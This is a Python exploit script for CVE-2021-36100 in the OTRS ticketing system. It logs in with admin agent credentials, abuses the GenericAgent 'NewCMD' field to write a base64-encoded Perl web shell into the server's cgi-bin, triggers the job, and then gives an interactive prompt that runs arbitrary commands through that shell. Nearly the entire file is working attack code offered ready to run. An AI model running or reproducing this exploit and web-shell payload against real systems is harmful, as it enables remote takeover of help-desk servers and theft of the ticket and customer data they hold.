#!/usr/bin/env python3

# Exploit Title: OTRS 6.0.X - Remote Command Execution
# Date: 17/12/2021
# Exploit Author: MBR
# Vendor Homepage: https://www.otrs.com/
# Software Link: http://ftp.otrs.org/pub/otrs/
# Version: 4.0.1 - 4.0.26, 5.0.0 - 5.0.24, 6.0.0 - 6.0.33
# Tested on: OTRS 6.0.33/Ubuntu 20.04
# CVE : CVE-2021-36100

import requests, sys, argparse

def init():

    parser = argparse.ArgumentParser(description='OTRS 6.0.X - Remote Command Execution')
    parser.add_argument('-u','--host',help='IP address of the OTRS server', type=str, required=True)
    parser.add_argument('-l', '--login',help='Username of an admin agent', type=str, required=True)
    parser.add_argument('-p', '--password',help='Password of an admin agent', type=str, required=True)
    args = parser.parse_args()
    exploit(args)
    shell(args)

def exploit(args):

    sess = requests.session();
    target = "http://{}/".format(args.host)
    username = args.login
    password = args.password 
    
    print("[+] Retrieving auth token")
    
    data = {"Action":"Login","RequestedURL":"","Lang":"en","TimeOffset":"-60","User":username,"Password":password}
    
    test = sess.post(target+"otrs/index.pl",data=data)

    
    if "OTRSAgentInterface" in sess.cookies.get_dict():
        print("[+] Successfully logged in")
    else:
        print("[-] Failed to log in. Bad credentials?")
        sys.exit() 

    print("[+] Grabbing challenge token from GenericAgent")
    
    contents = sess.get(target+"otrs/index.pl?Action=AdminGenericAgent;Subaction=Update;&OTRSAgentInterface="+sess.cookies.get_dict()["OTRSAgentInterface"]).text
    challTokenStart = contents.find('<input type="hidden" name="ChallengeToken" value="')+50
    challengeToken = contents[challTokenStart:challTokenStart+32]

    settings = {\
    "ChallengeToken":challengeToken,\
    "OTRSAgentInterface":sess.cookies.get_dict()["OTRSAgentInterface"],\
    "Action":"AdminGenericAgent",\
    "Subaction":"UpdateAction",\
    "ScheduleLastRun":"",\
    "OldProfile":"",\
    "Profile":"pwn",\
    "Valid":"1",\
    "EventType":"Ticket",\
    "ArticleEvent":"ArticleAgentNotification",\
    "TicketEvent":"EscalationResponseTimeNotifyBefore",\
    "TicketNumber":"*",\
    "Title":"",\
    "CustomerID":"",\
    "CustomerUserLogin":"",\
    "MIMEBase_From":"",\
    "MIMEBase_To":"",\
    "MIMEBase_Cc":"",\
    "MIMEBase_Subject":"",\
    "MIMEBase_Body":"",\
    "AddDynamicFields":"",\
    "TimeSearchType":"",\
    "TicketCreateTimePointStart":"Last",\
    "TicketCreateTimePoint":"1",\
    "TicketCreateTimePointFormat":"day",\
    "TicketCreateTimeStartMonth":"11",\
    "TicketCreateTimeStartDay":"13",\
    "TicketCreateTimeStartYear":"2021",\
    "TicketCreateTimeStopMonth":"12",\
    "TicketCreateTimeStopDay":"13",\
    "TicketCreateTimeStopYear":"2021",\
    "LastChangeTimeSearchType":"",\
    "TicketLastChangeTimePointStart":"Last",\
    "TicketLastChangeTimePoint":"1",\
    "TicketLastChangeTimePointFormat":"day",\
    "TicketLastChangeTimeStartMonth":"11",\
    "TicketLastChangeTimeStartDay":"13",\
    "TicketLastChangeTimeStartYear":"2021",\
    "TicketLastChangeTimeStopMonth":"12",\
    "TicketLastChangeTimeStopDay":"13",\
    "TicketLastChangeTimeStopYear":"2021",\
    "ChangeTimeSearchType":"",\
    "TicketChangeTimePointStart":"Last",\
    "TicketChangeTimePoint":"1",\
    "TicketChangeTimePointFormat":"day",\
    "TicketChangeTimeStartMonth":"11",\
    "TicketChangeTimeStartDay":"13",\
    "TicketChangeTimeStartYear":"2021",\
    "TicketChangeTimeStopMonth":"12",\
    "TicketChangeTimeStopDay":"13",\
    "TicketChangeTimeStopYear":"2021",\
    "LastCloseTimeSearchType":"",\
    "TicketLastCloseTimePointStart":"Last",\
    "TicketLastCloseTimePoint":"1",\
    "TicketLastCloseTimePointFormat":"day",\
    "TicketLastCloseTimeStartMonth":"11",\
    "TicketLastCloseTimeStartDay":"13",\
    "TicketLastCloseTimeStartYear":"2021",\
    "TicketLastCloseTimeStopMonth":"12",\
    "TicketLastCloseTimeStopDay":"13",\
    "TicketLastCloseTimeStopYear":"2021",\
    "CloseTimeSearchType":"",\
    "TicketCloseTimePointStart":"Last",\
    "TicketCloseTimePoint":"1",\
    "TicketCloseTimePointFormat":"day",\
    "TicketCloseTimeStartMonth":"11",\
    "TicketCloseTimeStartDay":"13",\
    "TicketCloseTimeStartYear":"2021",\
    "TicketCloseTimeStopMonth":"12",\
    "TicketCloseTimeStopDay":"13",\
    "TicketCloseTimeStopYear":"2021",\
    "TimePendingSearchType":"",\
    "TicketPendingTimePointStart":"Last",\
    "TicketPendingTimePoint":"1",\
    "TicketPendingTimePointFormat":"day",\
    "TicketPendingTimeStartMonth":"11",\
    "TicketPendingTimeStartDay":"13",\
    "TicketPendingTimeStartYear":"2021",\
    "TicketPendingTimeStopMonth":"12",\
    "TicketPendingTimeStopDay":"13",\
    "TicketPendingTimeStopYear":"2021",\
    "EscalationTimeSearchType":"",\
    "TicketEscalationTimePointStart":"Last",\
    "TicketEscalationTimePoint":"1",\
    "TicketEscalationTimePointFormat":"day",\
    "TicketEscalationTimeStartMonth":"11",\
    "TicketEscalationTimeStartDay":"13",\
    "TicketEscalationTimeStartYear":"2021",\
    "TicketEscalationTimeStopMonth":"12",\
    "TicketEscalationTimeStopDay":"13",\
    "TicketEscalationTimeStopYear":"2021",\
    "EscalationResponseTimeSearchType":"",\
    "TicketEscalationResponseTimePointStart":"Last",\
    "TicketEscalationResponseTimePoint":"1",\
    "TicketEscalationResponseTimePointFormat":"day",\
    "TicketEscalationResponseTimeStartMonth":"11",\
    "TicketEscalationResponseTimeStartDay":"13",\
    "TicketEscalationResponseTimeStartYear":"2021",\
    "TicketEscalationResponseTimeStopMonth":"12",\
    "TicketEscalationResponseTimeStopDay":"13",\
    "TicketEscalationResponseTimeStopYear":"2021",\
    "EscalationUpdateTimeSearchType":"",\
    "TicketEscalationUpdateTimePointStart":"Last",\
    "TicketEscalationUpdateTimePoint":"1",\
    "TicketEscalationUpdateTimePointFormat":"day",\
    "TicketEscalationUpdateTimeStartMonth":"11",\
    "TicketEscalationUpdateTimeStartDay":"13",\
    "TicketEscalationUpdateTimeStartYear":"2021",\
    "TicketEscalationUpdateTimeStopMonth":"12",\
    "TicketEscalationUpdateTimeStopDay":"13",\
    "TicketEscalationUpdateTimeStopYear":"2021",\
    "EscalationSolutionTimeSearchType":"",\
    "TicketEscalationSolutionTimePointStart":"Last",\
    "TicketEscalationSolutionTimePoint":"1",\
    "TicketEscalationSolutionTimePointFormat":"day",\
    "TicketEscalationSolutionTimeStartMonth":"11",\
    "TicketEscalationSolutionTimeStartDay":"13",\
    "TicketEscalationSolutionTimeStartYear":"2021",\
    "TicketEscalationSolutionTimeStopMonth":"12",\
    "TicketEscalationSolutionTimeStopDay":"13",\
    "TicketEscalationSolutionTimeStopYear":"2021",\
    "NewPendingTime":"",\
    "NewPendingTimeType":"60",\
    "NewCustomerUserLogin":"",\
    "NewCustomerID":"",\
    "NewTitle":"",\
    "AddNewDynamicFields":"",\
    "NewNoteFrom":"",\
    "NewNoteSubject":"",\
    "NewNoteBody":"",\
    "NewNoteTimeUnits":"",\
    "NewSendNoNotification":"0",\
    "NewCMD":"echo IyEvdXNyL2Jpbi9lbnYgcGVybAp1c2UgQ0dJOwpwcmludCBDR0k6OmhlYWRlcigtdHlwZSA9PiAndGV4dC9odG1sJyk7Cm15ICRjID0gQ0dJOjpwYXJhbSgnYycpOwpwcmludCBgJGNgOwo=|base64 -d > /opt/otrs/bin/cgi-bin/cmd.pl;",\
    "NewDelete":"0",\
    "NewModule":"",\
    "NewParamKey1":"",\
    "NewParamValue1":"",\
    "NewParamKey2":"",\
    "NewParamValue2":"",\
    "NewParamKey3":"",\
    "NewParamValue3":"",\
    "NewParamKey4":"",\
    "NewParamValue4":"",\
    "NewParamKey5":"",\
    "NewParamValue5":"",\
    "NewParamKey6":"",\
    "NewParamValue6":"",\
    }
    
    sess.post(target+"otrs/index.pl",data=settings)
    
    req = "otrs/index.pl?Action=AdminGenericAgent;Subaction=RunNow;Profile=pwn;ChallengeToken=" + challengeToken + ";;OTRSAgentInterface=" + sess.cookies.get_dict()["OTRSAgentInterface"];
    trig = sess.get(target+req)

    if trig.status_code == 200:
        pass
    else:
        print ("The task has not been created, please check the source code!") 

def shell(args):
    
    target = "http://{}/".format(args.host)
    cmd = ''  
    resp = requests.get(target + "otrs/cmd.pl")

    print("[+] Attempt to trigger the webshell")
    
    if resp.status_code == 200:
        print("[+] Exploit complete! Webshell at the following URL : " + target + "otrs/cmd.pl  Usage cmd.pl?c=cmd")
        print("")
        while cmd != 'exit':
            cmd = input("OTRS > ")
            if cmd == 'exit':
                pass
            else:
                sh = "otrs/cmd.pl?c=" + cmd
                pwn = requests.get(target+sh)
                decode = pwn.content.decode('utf-8')
                print(decode)

    else:
        print ("Exploit failed, please check the source code !")

if __name__ == "__main__":
    init()